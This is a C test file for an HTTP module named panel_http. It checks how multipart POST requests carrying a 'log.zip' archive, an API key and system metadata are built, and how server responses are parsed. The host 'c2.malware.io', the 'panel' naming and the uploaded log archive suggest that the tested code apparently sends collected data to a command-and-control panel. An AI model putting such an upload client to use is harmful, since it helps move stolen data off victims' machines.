/*
 * test_panel_http.c — HTTP request/response tests
 *
 * Tests multipart request construction, Content-Length calculation,
 * boundary formatting, and HTTP response parsing (mirroring panel_http.c).
 *
 * Build: gcc -Wall -Wextra -O2 -Iinclude -std=c11 -o tests/test_panel_http.exe tests/test_panel_http.c
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

static int passed = 0, failed = 0;
#define TEST(name) do { printf("  PASS: %s\n", name); passed++; } while(0)

typedef struct {
    char *header; size_t header_len;
    char *footer; size_t footer_len;
    size_t content_length;
} http_request_t;

static void build_multipart_request(http_request_t *req,
    const char *host, const char *api_path, const char *token,
    const char *boundary, size_t archive_len, const char *metadata)
{
    char header[2048];
    size_t meta_len = metadata ? strlen(metadata) : 0;
    size_t total_content = archive_len + meta_len + 100;
    int hlen = snprintf(header, sizeof(header),
        "POST %s HTTP/1.1\r\nHost: %s\r\nX-API-Key: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %zu\r\nConnection: close\r\n\r\n"
        "--%s\r\nContent-Disposition: form-data; name=\"archive\"; "
        "filename=\"log.zip\"\r\nContent-Type: application/octet-stream\r\n\r\n",
        api_path, host, token, boundary, total_content, boundary);
    req->header = malloc((size_t)hlen + 1);
    memcpy(req->header, header, (size_t)hlen);
    req->header[hlen] = '\0';
    req->header_len = (size_t)hlen;
    req->content_length = total_content;
    char footer[512];
    int flen = snprintf(footer, sizeof(footer),
        "\r\n--%s\r\nContent-Disposition: form-data; name=\"metadata\"\r\n\r\n"
        "%s\r\n--%s--\r\n", boundary, metadata ? metadata : "", boundary);
    req->footer = malloc((size_t)flen + 1);
    memcpy(req->footer, footer, (size_t)flen);
    req->footer[flen] = '\0';
    req->footer_len = (size_t)flen;
}

static void free_request(http_request_t *req) { free(req->header); free(req->footer); }

static int contains(const char *hay, size_t hlen, const char *needle) {
    size_t nlen = strlen(needle);
    if (nlen > hlen) return 0;
    for (size_t i = 0; i <= hlen - nlen; i++)
        if (memcmp(hay + i, needle, nlen) == 0) return 1;
    return 0;
}

static void test_request_method_post(void) {
    http_request_t req;
    build_multipart_request(&req, "example.com", "/api/log", "tok123", "----BoundA", 1000, "{}");
    assert(contains(req.header, req.header_len, "POST /api/log HTTP/1.1\r\n"));
    free_request(&req); TEST("test_request_method_post");
}

static void test_request_host_header(void) {
    http_request_t req;
    build_multipart_request(&req, "c2.malware.io", "/api/upload", "t", "----B", 100, "{}");
    assert(contains(req.header, req.header_len, "Host: c2.malware.io\r\n"));
    free_request(&req); TEST("test_request_host_header");
}

static void test_request_auth_header(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "my_secret_token_123", "----B", 100, "{}");
    assert(contains(req.header, req.header_len, "X-API-Key: my_secret_token_123\r\n"));
    free_request(&req); TEST("test_request_auth_header");
}

static void test_request_content_type(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----BoundaryXYZ", 100, "{}");
    assert(contains(req.header, req.header_len, "Content-Type: multipart/form-data; boundary=----BoundaryXYZ\r\n"));
    free_request(&req); TEST("test_request_content_type");
}

static void test_content_length_calculation(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 5000, "{\"os\":\"win10\"}");
    assert(req.content_length == 5000 + strlen("{\"os\":\"win10\"}") + 100);
    free_request(&req); TEST("test_content_length_calculation");
}

static void test_content_length_header_present(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, "{}");
    assert(contains(req.header, req.header_len, "Content-Length: "));
    free_request(&req); TEST("test_content_length_header_present");
}

static void test_content_length_zero_archive(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 0, "{}");
    assert(req.content_length == 102); /* 0 + 2 + 100 */
    free_request(&req); TEST("test_content_length_zero_archive");
}

static void test_content_length_large_archive(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 0xE0000000ULL, "m");
    assert(req.content_length > 0xE0000000ULL);
    free_request(&req); TEST("test_content_length_large_archive");
}

static void test_boundary_format(void) {
    const char *boundary = "----MirageBoundary";
    assert(strlen(boundary) > 0);
    assert(boundary[0] == '-');
    assert(boundary[1] == '-');
    TEST("test_boundary_format");
}

static void test_boundary_in_content_type(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----MyBound", 100, "{}");
    assert(contains(req.header, req.header_len, "boundary=----MyBound"));
    free_request(&req); TEST("test_boundary_in_content_type");
}

static void test_boundary_in_header_body(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, "{}");
    assert(contains(req.header, req.header_len, "--B\r\n"));
    free_request(&req); TEST("test_boundary_in_header_body");
}

static void test_boundary_in_footer(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, "{}");
    assert(contains(req.footer, req.footer_len, "--B\r\n"));
    assert(contains(req.footer, req.footer_len, "--B--\r\n"));
    free_request(&req); TEST("test_boundary_in_footer");
}

static void test_http_200_response(void) {
    const char *resp = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
    size_t total = strlen(resp);
    int ok = (total >= 12 && memcmp(resp, "HTTP/1.", 7) == 0 &&
              resp[9] == '2' && resp[10] == '0' && resp[11] == '0');
    assert(ok); TEST("test_http_200_response");
}

static void test_http_404_response(void) {
    const char *resp = "HTTP/1.1 404 Not Found\r\n\r\n";
    size_t total = strlen(resp);
    int ok = (total >= 12 && memcmp(resp, "HTTP/1.", 7) == 0 &&
              resp[9] == '2' && resp[10] == '0' && resp[11] == '0');
    assert(!ok); TEST("test_http_404_response");
}

static void test_http_500_response(void) {
    const char *resp = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
    size_t total = strlen(resp);
    int ok = (total >= 12 && memcmp(resp, "HTTP/1.", 7) == 0 &&
              resp[9] == '2' && resp[10] == '0' && resp[11] == '0');
    assert(!ok); TEST("test_http_500_response");
}

static void test_http_short_response(void) {
    const char *resp = "HTTP/1.1 ";
    size_t total = strlen(resp);
    int ok = (total >= 12 && memcmp(resp, "HTTP/1.", 7) == 0 &&
              resp[9] == '2' && resp[10] == '0' && resp[11] == '0');
    assert(!ok); TEST("test_http_short_response");
}

static void test_http_1_0_response(void) {
    const char *resp = "HTTP/1.0 200 OK\r\n\r\n";
    size_t total = strlen(resp);
    int ok = (total >= 12 && memcmp(resp, "HTTP/1.", 7) == 0 &&
              resp[9] == '2' && resp[10] == '0' && resp[11] == '0');
    assert(ok); TEST("test_http_1_0_response");
}

static void test_http_no_body_response(void) {
    const char *resp = "HTTP/1.1 200 ";
    size_t total = strlen(resp);
    int ok = (total >= 12 && memcmp(resp, "HTTP/1.", 7) == 0 &&
              resp[9] == '2' && resp[10] == '0' && resp[11] == '0');
    assert(ok); TEST("test_http_no_body_response");
}

static void test_metadata_json(void) {
    const char *meta = "{\"os\":\"win10\",\"arch\":\"x64\"}";
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, meta);
    assert(contains(req.footer, req.footer_len, meta));
    assert(contains(req.footer, req.footer_len, "name=\"metadata\""));
    free_request(&req); TEST("test_metadata_json");
}

static void test_empty_metadata(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, "");
    assert(contains(req.footer, req.footer_len, "name=\"metadata\""));
    free_request(&req); TEST("test_empty_metadata");
}

static void test_null_metadata(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, NULL);
    assert(contains(req.footer, req.footer_len, "name=\"metadata\""));
    free_request(&req); TEST("test_null_metadata");
}

static void test_connection_close(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, "{}");
    assert(contains(req.header, req.header_len, "Connection: close\r\n"));
    free_request(&req); TEST("test_connection_close");
}

static void test_archive_field_name(void) {
    http_request_t req;
    build_multipart_request(&req, "h", "/p", "t", "----B", 100, "{}");
    assert(contains(req.header, req.header_len, "name=\"archive\""));
    assert(contains(req.header, req.header_len, "filename=\"log.zip\""));
    assert(contains(req.header, req.header_len, "Content-Type: application/octet-stream"));
    free_request(&req); TEST("test_archive_field_name");
}

int main(void) {
    printf("=== test_panel_http: HTTP request/response tests ===\n");
    test_request_method_post(); test_request_host_header();
    test_request_auth_header(); test_request_content_type();
    test_content_length_calculation(); test_content_length_header_present();
    test_content_length_zero_archive(); test_content_length_large_archive();
    test_boundary_format(); test_boundary_in_content_type();
    test_boundary_in_header_body(); test_boundary_in_footer();
    test_http_200_response(); test_http_404_response();
    test_http_500_response(); test_http_short_response();
    test_http_1_0_response(); test_http_no_body_response();
    test_metadata_json(); test_empty_metadata(); test_null_metadata();
    test_connection_close(); test_archive_field_name();
    printf("=== test_panel_http: %d/%d PASSED ===\n", passed, passed + failed);
    return failed ? 1 : 0;
}
